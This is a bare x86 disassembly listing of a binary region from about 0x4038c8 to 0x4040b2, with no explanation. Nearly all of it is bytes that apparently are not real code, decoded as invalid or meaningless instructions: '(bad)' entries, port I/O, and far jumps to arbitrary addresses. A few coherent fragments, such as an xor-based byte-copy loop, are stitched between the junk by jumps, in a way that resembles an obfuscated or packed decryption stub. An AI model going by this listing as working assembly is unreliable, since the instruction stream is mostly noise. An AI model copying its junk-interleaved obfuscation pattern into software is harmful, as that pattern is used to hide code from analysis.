  4038c8:	xchg   esp,eax
  4038c9:	jae    0x403908
  4038cb:	data16 loop 0x4038d2
  4038ce:	xor    edx,DWORD PTR [edi+edi*4-0x1b6f6f20]
  4038d5:	loopne 0x40393f
  4038d7:	push   0x62
  4038d9:	stc    
  4038da:	test   DWORD PTR ds:[ebx+0x40],edx
  4038de:	test   al,0xa0
  4038e0:	cs retf 
  4038e2:	test   BYTE PTR [ebx+0x47],al
  4038e5:	shl    BYTE PTR [edx-0x5c],0xac
  4038e9:	cmp    DWORD PTR [ebp-0x12c8807f],ebx
  4038ef:	(bad)  
  4038f0:	and    al,0xb
  4038f2:	dec    eax
  4038f3:	sub    al,0xe
  4038f5:	out    dx,al
  4038f6:	pop    esp
  4038f7:	sbb    ch,bl
  4038f9:	jg     0x4038f2
  4038fb:	xchg   cl,ah
  4038fd:	inc    edi
  4038fe:	mov    edi,0x34ad2a45
  403903:	push   0x4253b01d
  403908:	and    eax,0x1c254455
  40390d:	inc    ebp
  40390e:	xor    ecx,DWORD PTR [edx-0x4b157864]
  403914:	(bad)  
  403916:	jnp    0x40397b
  403918:	xchg   edx,eax
  403919:	sub    eax,0xad87827c
  40391e:	or     DWORD PTR [ebx+0x5a],ecx
  403921:	cmp    BYTE PTR [ebx-0x1b],al
  403924:	outs   dx,DWORD PTR ds:[esi]
  403925:	je     0x4038c3
  403927:	or     ch,BYTE PTR [ebp-0x587810b8]
  40392d:	aas    
  40392e:	inc    ecx
  40392f:	lock jmp 0x8681dfce
  403935:	dec    eax
  403936:	in     al,dx
  403937:	(bad)  
  403938:	sbb    eax,0xc09f7497
  40393d:	xor    edx,eax
  40393f:	push   edi
  403940:	xchg   DWORD PTR [edx+ebp*1-0x3f],esi
  403944:	in     eax,dx
  403945:	sbb    BYTE PTR [edx],cl
  403947:	sbb    cl,BYTE PTR [eax-0x5cccafe0]
  40394d:	dec    bh
  40394f:	push   esp
  403950:	rol    BYTE PTR [ebx-0x53d5c8fb],cl
  403956:	in     eax,0x94
  403958:	fsub   QWORD PTR [eax-0x58]
  40395b:	sti    
  40395c:	cmc    
  40395d:	retf   
  40395e:	xchg   DWORD PTR [ebx],ecx
  403960:	test   eax,0x440a6bd6
  403965:	xor    al,0x52
  403967:	xor    esp,DWORD PTR [edx-0x4dfcd8de]
  40396d:	out    dx,al
  40396e:	mov    WORD PTR [edi+ecx*1],?
  403971:	aam    0x65
  403973:	jae    0x403966
  403975:	jg     0x4039e1
  403977:	sub    al,BYTE PTR [esi]
  403979:	sub    al,0xd2
  40397b:	mov    bl,0xe8
  40397d:	push   esp
  40397e:	adc    ebx,DWORD PTR [ecx+0x663e4ee8]
  403984:	aaa    
  403985:	add    esi,DWORD PTR [esi-0x54]
  403988:	hlt    
  403989:	mov    WORD PTR [eax+0x275ca67d],cs
  40398f:	inc    ebp
  403990:	push   esi
  403991:	mov    edx,0x5b1da12d
  403996:	xchg   DWORD PTR [ebp+0x15c5ee5e],eax
  40399c:	(bad)  
  40399d:	fadd   DWORD PTR [ecx]
  40399f:	cmp    esi,0xd86738ed
  4039a5:	pop    esi
  4039a6:	mov    eax,ds:0xe9481bfc
  4039ab:	push   ds
  4039ac:	jecxz  0x40395a
  4039ae:	leave  
  4039af:	push   ebx
  4039b0:	jo     0x403952
  4039b2:	repnz inc esi
  4039b4:	(bad)  
  4039b5:	xchg   esi,eax
  4039b6:	popa   
  4039b7:	das    
  4039b8:	jmp    0xad3a44de
  4039bd:	push   edi
  4039be:	or     dl,dh
  4039c0:	into   
  4039c1:	mov    ?,WORD PTR [ecx+0x63]
  4039c4:	xchg   edx,eax
  4039c5:	fisttp QWORD PTR [edi+0xf1f6773]
  4039cb:	xchg   edi,eax
  4039cc:	push   ecx
  4039cd:	adc    al,0x68
  4039cf:	dec    ebx
  4039d0:	pop    ss
  4039d1:	and    edi,DWORD PTR [ebp-0x7]
  4039d4:	jmp    0x34679e17
  4039d9:	fs test al,0xfc
  4039dc:	and    esp,edi
  4039de:	push   es
  4039df:	(bad)  
  4039e0:	sub    esp,DWORD PTR [ecx+ebp*4-0x58]
  4039e4:	xchg   bh,al
  4039e6:	idiv   BYTE PTR [edx-0xa031b21]
  4039ec:	iret   
  4039ed:	dec    ebx
  4039ee:	stos   BYTE PTR es:[edi],al
  4039ef:	mov    cl,0xe4
  4039f1:	mov    ds:0x70db561,eax
  4039f6:	mul    DWORD PTR [edi]
  4039f8:	add    BYTE PTR [ebx-0x6ff0f5b4],0x1c
  4039ff:	lahf   
  403a00:	xchg   ebp,eax
  403a01:	out    0x85,eax
  403a03:	lahf   
  403a04:	add    cl,BYTE PTR [ecx+0x3e]
  403a07:	call   0x1c3f:0xf3f4627b
  403a0e:	shl    DWORD PTR [eax-0x77],cl
  403a11:	pop    edi
  403a12:	inc    edi
  403a13:	loopne 0x403a64
  403a15:	mov    al,dh
  403a17:	mov    esi,0xde36b468
  403a1c:	unpcklps xmm0,XMMWORD PTR [ecx+edi*4+0x139362c3]
  403a24:	daa    
  403a25:	ss jp  0x403aa1
  403a28:	lods   al,BYTE PTR ds:[esi]
  403a29:	repz mov bh,0x16
  403a2c:	or     ecx,DWORD PTR [eax-0x4daafd95]
  403a32:	mov    ebx,0x8d9d6395
  403a37:	mov    edi,0x894ff7cd
  403a3c:	test   al,0x37
  403a3e:	pop    es
  403a3f:	xchg   ecx,eax
  403a40:	data16 loope 0x403a4b
  403a43:	xchg   ebx,eax
  403a44:	push   ss
  403a45:	xchg   edi,eax
  403a46:	popf   
  403a47:	and    ecx,DWORD PTR [ecx-0x1ff04fd0]
  403a4d:	jbe    0x403a13
  403a4f:	pop    eax
  403a50:	mov    edi,DWORD PTR [ebp-0x4]
  403a53:	jmp    0x403c5f
  403a58:	addr16 jo 0x403aaa
  403a5b:	or     BYTE PTR [ebx+0x33],cl
  403a5e:	arpl   WORD PTR [ebx+0x3c],si
  403a61:	aas    
  403a62:	cwde   
  403a63:	pop    ss
  403a64:	aam    0x67
  403a66:	imul   esi,DWORD PTR [edx+0x65],0x1e
  403a6a:	jl     0x403ae8
  403a6c:	ins    DWORD PTR es:[edi],dx
  403a6d:	jg     0x403aeb
  403a6f:	jl     0x403a01
  403a71:	push   0x1b4fc964
  403a76:	sub    al,0x63
  403a78:	jge    0x403ab2
  403a7a:	popa   
  403a7b:	loope  0x403aa0
  403a7d:	in     eax,dx
  403a7e:	enter  0xef83,0x58
  403a82:	hlt    
  403a83:	sub    al,0xa0
  403a85:	pusha  
  403a86:	imul   edi,edx,0xffffffe6
  403a89:	inc    esp
  403a8a:	cld    
  403a8b:	inc    edx
  403a8c:	cmc    
  403a8d:	jp     0x403acd
  403a8f:	jmp    0x7dde:0x25f08e50
  403a96:	mov    bl,0xe8
  403a98:	jo     0x403ae4
  403a9a:	pop    edx
  403a9b:	xor    BYTE PTR [edx-0x50],dh
  403a9e:	fadd   st(5),st
  403aa0:	pop    ds
  403aa1:	adc    BYTE PTR [eax-0x31a62ae9],dl
  403aa7:	ins    DWORD PTR es:[edi],dx
  403aa8:	enter  0x5f44,0x36
  403aac:	leave  
  403aad:	jns    0x403ae3
  403aaf:	add    ch,BYTE PTR [esi+edx*4]
  403ab2:	add    ecx,DWORD PTR [ecx+0x51a2164a]
  403ab8:	add    BYTE PTR [ebx-0x4fb164e6],bl
  403abe:	mov    ch,0xe0
  403ac0:	xchg   DWORD PTR [edi-0x16],ebx
  403ac3:	in     eax,dx
  403ac4:	xor    ebp,0xffffff9f
  403ac7:	das    
  403ac8:	cmp    DWORD PTR [edx+0x4448689f],edi
  403ace:	add    al,0xc9
  403ad0:	jno    0x403a69
  403ad2:	mov    edi,0x78ca130f
  403ad7:	or     ebp,DWORD PTR [edi+0x3d328055]
  403add:	ror    edx,0xe3
  403ae0:	or     bl,bh
  403ae2:	test   eax,0x6869f5c5
  403ae7:	jns    0x403b13
  403ae9:	ja     0x403a98
  403aeb:	fisttp QWORD PTR [ebp+0x358f5b85]
  403af1:	lods   eax,DWORD PTR ds:[esi]
  403af2:	pushf  
  403af3:	xlat   BYTE PTR ds:[ebx]
  403af4:	call   0xf433:0xdaa6a6f5
  403afb:	mov    ecx,ebp
  403afd:	sub    BYTE PTR [ebp-0x72267821],ch
  403b03:	mov    edx,0x55d67f93
  403b08:	mov    ds:0x4443e825,al
  403b0d:	push   es
  403b0e:	cmp    ecx,ebp
  403b10:	inc    eax
  403b11:	clc    
  403b12:	cld    
  403b13:	mov    esi,0x5244a91d
  403b18:	std    
  403b19:	xchg   ecx,eax
  403b1a:	out    0x93,al
  403b1c:	adc    dl,BYTE PTR [ecx+ebx*4+0x73]
  403b20:	jmp    0x71d6f0f4
  403b25:	jmp    0x403b7e
  403b27:	rcr    dl,1
  403b29:	enter  0x7f6a,0x23
  403b2d:	mov    edi,0xfb16ad87
  403b32:	in     al,0x53
  403b34:	add    BYTE PTR [ecx],cl
  403b36:	sbb    ecx,DWORD PTR [edi]
  403b38:	jecxz  0x403bb4
  403b3a:	shr    BYTE PTR [esi],0x8d
  403b3d:	mov    al,ds:0x3baad172
  403b42:	and    al,0xa
  403b44:	iret   
  403b45:	test   BYTE PTR [eax],0xdc
  403b48:	fwait
  403b49:	jmp    0x403acb
  403b4b:	add    bl,bh
  403b4d:	xchg   DWORD PTR [ecx-0x5766baef],ecx
  403b53:	(bad)  
  403b54:	shl    BYTE PTR [edx+0x65],cl
  403b57:	and    eax,0xa29d8604
  403b5c:	(bad)  [ebx-0x40]
  403b5f:	sar    DWORD PTR [esi+edx*1-0x10],cl
  403b63:	xor    al,0xfa
  403b65:	mov    ebx,0x496ecaef
  403b6a:	lds    edi,FWORD PTR [esi-0x1b]
  403b6d:	dec    edx
  403b6e:	ror    cl,1
  403b70:	xchg   ecx,eax
  403b71:	and    BYTE PTR [ebx],al
  403b73:	idiv   ah
  403b75:	push   esi
  403b76:	xor    DWORD PTR [esi+0x73],esi
  403b79:	(bad)  
  403b7a:	and    ebx,esi
  403b7c:	jmp    0x403bf6
  403b7e:	sbb    bl,BYTE PTR [ecx+0x7d371fbb]
  403b84:	adc    BYTE PTR [edi+0x4aa5b4c7],bh
  403b8a:	imul   esp,DWORD PTR [edi+0x778f4c69],0x41649038
  403b94:	mov    al,0x1e
  403b96:	jns    0x403b32
  403b98:	pop    edx
  403b99:	jp     0x403b59
  403b9b:	out    dx,eax
  403b9c:	mov    esi,0x94d3a048
  403ba1:	retf   
  403ba2:	ret    0xd73
  403ba5:	and    ebp,DWORD PTR [edx+0x81369f2]
  403bab:	cwde   
  403bac:	sub    BYTE PTR [ecx],ch
  403bae:	inc    eax
  403baf:	or     ecx,0xffffffdf
  403bb2:	jno    0x403c14
  403bb4:	mov    DWORD PTR [eax+0x2f],esi
  403bb7:	nop
  403bb8:	sbb    al,0x3
  403bba:	sti    
  403bbb:	mov    ds:0x882bb430,al
  403bc0:	call   0xeb4abb7
  403bc5:	test   BYTE PTR [edx],ah
  403bc7:	test   BYTE PTR ds:0xc2583f38,dl
  403bcd:	aam    0x88
  403bcf:	adc    edx,ebx
  403bd1:	xchg   ebx,eax
  403bd2:	mov    esi,esi
  403bd4:	dec    esp
  403bd5:	dec    edi
  403bd6:	jmp    0x86f7f6f0
  403bdb:	push   edx
  403bdc:	and    DWORD PTR [esi+eiz*8+0x6f84b35a],eax
  403be3:	sahf   
  403be4:	and    eax,0xfe8053fe
  403be9:	push   eax
  403bea:	cmp    al,BYTE PTR [ebx]
  403bec:	dec    esp
  403bed:	pop    ebp
  403bee:	stc    
  403bef:	or     BYTE PTR [ecx],ch
  403bf1:	adc    dh,ah
  403bf3:	fsubr  QWORD PTR [eax]
  403bf5:	or     ebx,ecx
  403bf7:	sbb    BYTE PTR [ebx+0x4f],ah
  403bfa:	cs outs dx,DWORD PTR gs:[esi]
  403bfd:	jg     0x403bff
  403bff:	jnp    0x403bc9
  403c01:	cmp    eax,0x3471ba9f
  403c06:	rcr    BYTE PTR [ebp+ebx*1-0x3c],0x39
  403c0b:	cmp    dh,bl
  403c0d:	jle    0x403c4f
  403c0f:	aaa    
  403c10:	jge    0x403c5a
  403c12:	clc    
  403c13:	xchg   edi,eax
  403c14:	xor    ebx,esp
  403c16:	push   edx
  403c17:	es and eax,0x88b07d96
  403c1d:	adc    eax,0x32fdcd0f
  403c22:	lds    ecx,FWORD PTR [esi-0x5]
  403c25:	les    ecx,FWORD PTR [edx+0x20]
  403c28:	xchg   edx,eax
  403c29:	pushf  
  403c2a:	aaa    
  403c2b:	jl     0x403bdd
  403c2d:	jnp    0x403bb3
  403c2f:	scas   eax,DWORD PTR es:[edi]
  403c30:	pop    ds
  403c31:	(bad)  
  403c32:	mov    al,ds:0x16d30ded
  403c37:	push   eax
  403c38:	ret    
  403c39:	or     ecx,DWORD PTR [eax]
  403c3b:	push   eax
  403c3c:	push   ebx
  403c3d:	adc    DWORD PTR [eax-0x6a],esp
  403c40:	add    dh,cl
  403c42:	loopne 0x403c24
  403c44:	push   ebp
  403c45:	(bad)  
  403c46:	std    
  403c47:	dec    edi
  403c48:	xchg   cl,ah
  403c4a:	inc    ecx
  403c4b:	sbb    eax,0x70c48427
  403c50:	pop    ecx
  403c51:	ins    BYTE PTR es:[edi],dx
  403c52:	mov    ds:0x4a2483e9,eax
  403c57:	call   esi
  403c59:	outs   dx,DWORD PTR ds:[esi]
  403c5a:	jbe    0x403c91
  403c5c:	add    DWORD PTR [edi+0x17],ebx
  403c5f:	xor    edi,ecx
  403c61:	add    edi,esi
  403c63:	mov    esi,DWORD PTR [ebp+0x8]
  403c66:	imul   edi,edx
  403c69:	mov    ebx,DWORD PTR [ebp+0xc]
  403c6c:	xor    eax,ecx
  403c6e:	add    eax,edx
  403c70:	mov    al,BYTE PTR [ebx+eax*1+0x32729a]
  403c77:	mov    BYTE PTR [edi+esi*1],al
  403c7a:	mov    eax,DWORD PTR [ebp-0x4]
  403c7d:	xor    eax,ecx
  403c7f:	lea    edx,[edx+eax*1+0x32729a]
  403c86:	mov    eax,DWORD PTR [ebp-0x4]
  403c89:	xor    eax,ecx
  403c8b:	mov    esi,0xffcd8d66
  403c90:	jmp    0x403e9c
  403c95:	dec    edi
  403c96:	push   ss
  403c97:	sbb    eax,DWORD PTR [ebp+ebp*2+0x7d]
  403c9b:	jae    0x403cae
  403c9d:	sti    
  403c9e:	adc    ebp,DWORD PTR ds:0x580a4b97
  403ca4:	sbb    eax,0x7c7c184a
  403ca9:	ins    DWORD PTR es:[edi],dx
  403caa:	jg     0x403d28
  403cac:	jl     0x403d1d
  403cae:	mov    BYTE PTR [esi+0xcc6a4cf],cl
  403cb4:	add    eax,0x2e2a5df9
  403cb9:	xor    eax,0x95ccf1a9
  403cbe:	jno    0x403cda
  403cc0:	xchg   edx,eax
  403cc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403cc2:	repnz out dx,al
  403cc4:	inc    ebx
  403cc5:	lock clc 
  403cc7:	pop    ebx
  403cc8:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  403cca:	or     edx,DWORD PTR [ebx]
  403ccc:	aas    
  403ccd:	test   eax,0xd2d43642
  403cd2:	add    esi,DWORD PTR [edx-0x28]
  403cd5:	push   ss
  403cd6:	(bad)  
  403cd7:	cmp    dh,BYTE PTR [edi+ecx*8]
  403cda:	test   DWORD PTR fs:[edx-0x4],0xdb7682fe
  403ce2:	xchg   edi,eax
  403ce3:	jg     0x403d0c
  403ce5:	and    BYTE PTR [ebp+0x4],0xc7
  403ce9:	or     bh,BYTE PTR ds:0xc5ce074c
  403cef:	jnp    0x403cca
  403cf1:	mov    WORD PTR [esi],es
  403cf3:	or     al,ah
  403cf5:	fisttp QWORD PTR [eax+0x244c08cb]
  403cfb:	push   es
  403cfc:	pop    ebx
  403cfd:	or     BYTE PTR ds:[edi+0x6247fb96],bh
  403d04:	xor    DWORD PTR [esp+ecx*4-0x750c624],eax
  403d0b:	fisub  WORD PTR [ebp-0x7a]
  403d0e:	(bad)  
  403d0f:	sbb    al,0x97
  403d11:	or     DWORD PTR [edx-0x42],ebx
  403d14:	out    dx,eax
  403d15:	and    ch,BYTE PTR [esi]
  403d17:	daa    
  403d18:	les    edx,FWORD PTR [ebp-0x22045739]
  403d1e:	(bad)  
  403d1f:	pop    ebp
  403d20:	mov    edi,0x18347332
  403d25:	xchg   edx,eax
  403d26:	jp     0x403cbc
  403d28:	icebp  
  403d29:	loope  0x403cb0
  403d2b:	test   al,0x5a
  403d2d:	out    0xd8,eax
  403d2f:	xor    eax,0x4054030b
  403d34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d35:	pop    esp
  403d36:	xor    al,0x95
  403d38:	cmp    eax,0x1881b4dc
  403d3d:	xor    eax,0xb202a6cd
  403d42:	stc    
  403d43:	add    ch,BYTE PTR [ecx+edi*4-0x2f]
  403d47:	jmp    0x455:0x6da3d1ec
  403d4e:	test   al,0x88
  403d50:	sub    eax,0x282c365e
  403d55:	sti    
  403d56:	and    esi,eax
  403d58:	sbb    BYTE PTR [ecx+ebp*1],cl
  403d5b:	in     eax,dx
  403d5c:	mov    ah,0x4e
  403d5e:	mov    eax,0x37993540
  403d63:	or     BYTE PTR [ebx-0x22f132ee],bl
  403d69:	add    ecx,ebp
  403d6b:	xor    eax,0x1e1352f8
  403d70:	add    al,0xf2
  403d72:	dec    edx
  403d73:	xlat   BYTE PTR ds:[ebx]
  403d74:	(bad)  
  403d75:	iret   
  403d76:	adc    al,bh
  403d78:	jmp    0x403d88
  403d7a:	fstp   TBYTE PTR [ebp+0xc]
  403d7d:	fs jo  0x403d86
  403d80:	hlt    
  403d81:	inc    edi
  403d82:	jmp    0x403d90
  403d84:	repz add dh,BYTE PTR [ebx-0x75]
  403d88:	add    ecx,DWORD PTR [ebp+0x5b]
  403d8b:	mov    esi,0xc3cf6f16
  403d90:	mov    ecx,0xed640112
  403d95:	fwait
  403d96:	scas   eax,DWORD PTR es:[edi]
  403d97:	stos   BYTE PTR es:[edi],al
  403d98:	inc    edx
  403d99:	jno    0x403d83
  403d9b:	outs   dx,DWORD PTR ds:[esi]
  403d9c:	dec    edx
  403d9d:	or     ebx,ebx
  403d9f:	ja     0x403d90
  403da1:	stos   DWORD PTR es:[edi],eax
  403da2:	cmp    eax,0xf80d09a
  403da7:	or     al,0x63
  403da9:	shl    BYTE PTR [eax],1
  403dab:	in     al,0xb5
  403dad:	icebp  
  403dae:	dec    ebx
  403daf:	mov    edi,0xe226ed05
  403db4:	mov    esi,0xa8eb7565
  403db9:	pop    ecx
  403dba:	dec    ebx
  403dbb:	(bad)  
  403dbc:	stos   BYTE PTR es:[edi],al
  403dbd:	xchg   ebx,eax
  403dbe:	dec    ebx
  403dbf:	lea    edi,[edx+0x4f1e0ed6]
  403dc5:	push   eax
  403dc6:	idiv   BYTE PTR [ebp-0x67792998]
  403dcc:	mov    cl,0x87
  403dce:	fsubrp st(4),st
  403dd0:	fisubr DWORD PTR [ebp+0x75]
  403dd3:	mov    DWORD PTR [eax],ebp
  403dd5:	jae    0x7059cd61
  403ddb:	(bad)  
  403ddd:	outs   dx,DWORD PTR ds:[esi]
  403dde:	pop    es
  403ddf:	test   DWORD PTR [eax-0x22e98221],0x31c0bc43
  403de9:	jmp    0x4696:0x5372ba08
  403df0:	push   edi
  403df1:	sub    BYTE PTR [eax],al
  403df3:	or     al,0x20
  403df5:	push   ss
  403df6:	das    
  403df7:	sbb    eax,0xc5c0c271
  403dfc:	mov    esi,0x2b68c7cd
  403e01:	pop    edi
  403e02:	js     0x403df5
  403e04:	mov    ds:0x55d95896,eax
  403e09:	pop    ebp
  403e0a:	jae    0x403e5b
  403e0c:	jge    0x403e71
  403e0e:	cli    
  403e0f:	into   
  403e10:	popa   
  403e11:	fs push ebp
  403e13:	push   es
  403e14:	pushf  
  403e15:	cmp    al,0x4f
  403e17:	test   BYTE PTR [ebp+0x793cee12],al
  403e1d:	jg     0x403df2
  403e1f:	test   al,0xe6
  403e21:	into   
  403e22:	daa    
  403e23:	dec    esp
  403e24:	pusha  
  403e25:	xchg   ebx,eax
  403e26:	mov    BYTE PTR [ebp+eax*4-0x66],ch
  403e2a:	cli    
  403e2b:	iret   
  403e2c:	ins    DWORD PTR es:[edi],dx
  403e2d:	xor    ebp,esi
  403e2f:	iret   
  403e30:	aad    0xe0
  403e32:	pop    ecx
  403e33:	bnd jle 0x403e72
  403e36:	int3   
  403e37:	lahf   
  403e38:	mov    ch,BYTE PTR [eax+0x72]
  403e3b:	xor    BYTE PTR [ebx+ebp*1-0x1a993c23],ah
  403e42:	test   DWORD PTR [esi+ebp*1+0x74a0a35e],ecx
  403e49:	gs stc 
  403e4b:	in     al,dx
  403e4c:	xchg   ebx,eax
  403e4d:	xchg   esp,eax
  403e4e:	mov    esp,0x795bbb9b
  403e53:	add    DWORD PTR [ecx+0x5f6bcdd0],0xe7a2b30e
  403e5d:	mov    dh,0xe0
  403e5f:	xor    eax,0x4f025220
  403e64:	out    dx,eax
  403e65:	jge    0x403e8c
  403e67:	sub    al,0x96
  403e69:	js     0x403edb
  403e6b:	stos   BYTE PTR es:[edi],al
  403e6c:	mov    BYTE PTR [ebx+0x60],dh
  403e6f:	mov    ebx,0x2f9327e
  403e74:	push   esi
  403e75:	xor    DWORD PTR [edx],esp
  403e77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e78:	imul   esp,DWORD PTR [edx+0x7f],0x998f5911
  403e7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e80:	in     al,dx
  403e81:	int3   
  403e82:	sub    BYTE PTR [esi+edx*2+0x54f0e3a7],al
  403e89:	mov    ah,0x3b
  403e8b:	aaa    
  403e8c:	cwde   
  403e8d:	scas   al,BYTE PTR es:[edi]
  403e8e:	stos   DWORD PTR es:[edi],eax
  403e8f:	xlat   BYTE PTR ds:[ebx]
  403e90:	test   eax,0xaa61734f
  403e95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e96:	cmp    al,bh
  403e98:	jb     0x403e89
  403e9a:	inc    esi
  403e9b:	jb     0x403ec8
  403e9d:	lock add esi,DWORD PTR [ebp+0x10]
  403ea1:	cmp    edx,esi
  403ea3:	jbe    0x403630
  403ea9:	pop    ebx
  403eaa:	mov    eax,0xf89c8534
  403eaf:	pop    edi
  403eb0:	pop    esi
  403eb1:	leave  
  403eb2:	ret    0xc
  403eb5:	push   ebp
  403eb6:	mov    ebp,esp
  403eb8:	mov    eax,DWORD PTR [ebp+0xc]
  403ebb:	xor    edx,edx
  403ebd:	mov    ecx,0x7264fcad
  403ec2:	div    ecx
  403ec4:	mov    ecx,DWORD PTR [ebp+0x10]
  403ec7:	and    ecx,eax
  403ec9:	jmp    0x4040d5
  403ece:	(bad)  
  403ecf:	addr16 jns 0x403f24
  403ed2:	icebp  
  403ed3:	jb     0x403f28
  403ed5:	ins    DWORD PTR es:[edi],dx
  403ed6:	add    al,0x2a
  403ed8:	pop    esi
  403ed9:	push   0x96572e82
  403ede:	mov    ebx,0x6d7c7c1a
  403ee3:	jg     0x403f61
  403ee5:	jl     0x403f06
  403ee7:	or     BYTE PTR [ecx-0x6cf87af],ch
  403eed:	jmp    0xd3af:0x98deb71f
  403ef4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ef5:	aam    0x87
  403ef7:	mov    ch,0xa0
  403ef9:	mov    cl,0x79
  403efb:	or     DWORD PTR [esi+0x5e68a1dc],edi
  403f01:	mul    bh
  403f03:	mov    DWORD PTR [edi-0x76],esi
  403f06:	sub    al,0x2c
  403f08:	dec    ebx
  403f09:	(bad)  
  403f0a:	jb     0x403ec6
  403f0c:	xchg   edi,eax
  403f0d:	inc    eax
  403f0e:	popa   
  403f0f:	xlat   BYTE PTR ds:[ebx]
  403f10:	pop    ebp
  403f11:	sub    BYTE PTR [eax+0x60f3295a],bh
  403f17:	push   sp
  403f19:	test   al,0x7c
  403f1b:	shl    BYTE PTR [eax],1
  403f1d:	in     al,0x1c
  403f1f:	call   0x194cf390
  403f24:	cmp    dh,BYTE PTR [ebp-0x418accc6]
  403f2a:	lds    edx,FWORD PTR [ebx+ecx*8+0x7b]
  403f2e:	dec    ecx
  403f2f:	pop    ebx
  403f30:	add    BYTE PTR [edi-0x3607cabc],0x64
  403f37:	inc    ecx
  403f38:	aas    
  403f39:	mov    ebp,0xdcf8d16b
  403f3e:	cmp    BYTE PTR [ebx-0x57bf38b8],al
  403f44:	xchg   DWORD PTR [ebp+0x5464d8dc],esi
  403f4a:	mov    ch,0x6b
  403f4c:	jmp    0xb737:0x8eb3835c
  403f53:	jp     0x403f7b
  403f55:	jbe    0x403f8e
  403f57:	(bad)  
  403f58:	gs jp  0x403f19
  403f5b:	imul   ebp,DWORD PTR [esi-0x512d5f78],0xf2c029c9
  403f65:	ins    BYTE PTR es:[edi],dx
  403f66:	push   esi
  403f67:	out    dx,al
  403f68:	adc    al,0x7a
  403f6a:	addr16 push ebp
  403f6c:	mov    bh,0x1e
  403f6e:	mov    al,0x7c
  403f70:	mov    ds:0xeeeda4d6,eax
  403f75:	ja     0x403f0f
  403f77:	(bad)  
  403f79:	cli    
  403f7a:	les    ecx,FWORD PTR [esi+0x2b]
  403f7d:	push   ebp
  403f7e:	leave  
  403f7f:	jne    0x403fdb
  403f81:	lods   al,BYTE PTR ds:[esi]
  403f82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f83:	into   
  403f84:	xchg   ecx,eax
  403f85:	stc    
  403f86:	and    eax,0x48114363
  403f8b:	jbe    0x403ff8
  403f8d:	ret    
  403f8e:	and    BYTE PTR [eax+0x4139d4b6],bh
  403f94:	add    al,0xf9
  403f96:	ss jmp 0xe53f:0xbebe0a3c
  403f9e:	lods   al,BYTE PTR ds:[esi]
  403f9f:	xor    eax,0xb1abe53
  403fa4:	ss rcr bh,1
  403fa7:	mov    eax,0x2f0ce31b
  403fac:	pushf  
  403fad:	push   ss
  403fae:	fwait
  403faf:	(bad)  
  403fb0:	mov    ebx,0x9791865a
  403fb5:	push   ecx
  403fb6:	and    eax,0x8f8d8f9f
  403fbb:	in     al,0x21
  403fbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403fbe:	inc    edx
  403fbf:	out    0xdf,eax
  403fc1:	push   0x70549184
  403fc6:	add    bl,ch
  403fc8:	sbb    DWORD PTR [edx+0x23],eax
  403fcb:	mov    ecx,0x65d49620
  403fd0:	mov    DWORD PTR [ecx+0x6],esp
  403fd3:	sti    
  403fd4:	in     al,dx
  403fd5:	rol    BYTE PTR [edx-0x768a4012],0x14
  403fdc:	nop
  403fdd:	or     edi,esi
  403fdf:	fisubr WORD PTR [edx+0x4bb27a08]
  403fe5:	push   0x42
  403fe7:	cmc    
  403fe8:	sbb    DWORD PTR [bp+di-0x70f],0x66
  403fee:	in     eax,0xd9
  403ff0:	cwde   
  403ff1:	jl     0x403fd8
  403ff3:	rcl    al,0xb6
  403ff6:	aas    
  403ff7:	(bad)  
  403ff8:	push   0x6ceb1862
  403ffd:	sub    ah,BYTE PTR [ebx]
  403fff:	jmp    FWORD PTR [edx-0x3cdff37b]
  404005:	imul   edx,DWORD PTR [eax-0x2ac9b281],0x6a
  40400c:	icebp  
  40400d:	or     DWORD PTR [ebx-0x6e],edi
  404010:	inc    esi
  404011:	inc    DWORD PTR [edi]
  404013:	and    bh,BYTE PTR [ebp-0x67b6c286]
  404019:	in     eax,0xd2
  40401b:	sbb    edx,DWORD PTR [ebp-0x2a207c16]
  404021:	dec    esp
  404022:	or     DWORD PTR [ebp-0x7a],edi
  404025:	push   0x2e
  404027:	add    eax,0x8a353217
  40402c:	int    0xec
  40402e:	cmp    bh,al
  404030:	push   cs
  404031:	push   ebx
  404032:	mov    ds:0xcdfa7de0,al
  404037:	mov    dl,0x72
  404039:	aam    0xd6
  40403b:	out    dx,eax
  40403c:	in     al,0x97
  40403e:	rcr    BYTE PTR [ecx-0x234be596],1
  404044:	xchg   ebp,eax
  404045:	mov    bh,0x8d
  404047:	jle    0x403fd5
  404049:	or     DWORD PTR [edi+0x33],eax
  40404c:	inc    edi
  40404d:	pop    edi
  40404e:	or     BYTE PTR [eax+0xc],bl
  404051:	fs mov edx,0xe2abfdd7
  404057:	dec    ebp
  404058:	xor    ebp,DWORD PTR [eax]
  40405a:	lea    edi,[ebx]
  40405c:	fwait
  40405d:	dec    esp
  40405e:	jmp    0xd21f3e9d
  404063:	inc    edx
  404064:	sbb    BYTE PTR [edi+0x2a],0x99
  404068:	and    esi,ebx
  40406a:	enter  0x165f,0x8f
  40406e:	ins    DWORD PTR es:[edi],dx
  40406f:	xchg   edi,eax
  404070:	nop
  404071:	mov    ebx,0x7967197a
  404076:	sbb    al,0x7
  404078:	push   edx
  404079:	mov    dh,0xbd
  40407b:	pop    ecx
  40407c:	pop    ds
  40407d:	dec    edx
  40407e:	or     DWORD PTR [edx],ecx
  404080:	mov    ds:0xf58e8e6,eax
  404085:	cwde   
  404086:	fbstp  TBYTE PTR [ebx-0x2bb5cb6f]
  40408c:	ret    0x7a41
  40408f:	push   ds
  404090:	mov    cl,0x3e
  404092:	dec    edi
  404093:	stos   BYTE PTR es:[edi],al
  404094:	mov    BYTE PTR [ebx-0x3f8ed48f],bh
  40409a:	outs   dx,BYTE PTR ds:[esi]
  40409b:	jl     0x404032
  40409d:	nop
  40409e:	inc    esi
  40409f:	test   DWORD PTR [ebx],eax
  4040a1:	outs   dx,BYTE PTR ds:[esi]
  4040a2:	test   eax,0x4b69cab3
  4040a7:	rol    BYTE PTR [ebx+0x27],1
  4040aa:	or     eax,0xb2d29546
  4040af:	retf   0xa5b7
  4040b2:	rcl    BYTE PTR [edx-0x66],0x74
